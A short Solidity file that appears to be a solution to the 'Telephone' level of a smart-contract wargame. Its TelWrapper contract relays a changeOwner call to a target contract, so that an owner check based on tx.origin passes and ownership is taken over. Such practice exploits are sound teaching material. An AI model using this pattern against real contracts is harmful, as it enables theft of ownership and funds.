// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner (address newOwner) external;
}

contract TelWrapper {
    address public contractAddress;

    constructor(address a){
        contractAddress = a;
    }

    function changeOwner(address newOwner) external {
        ITelephone(contractAddress).changeOwner(newOwner);
    }
}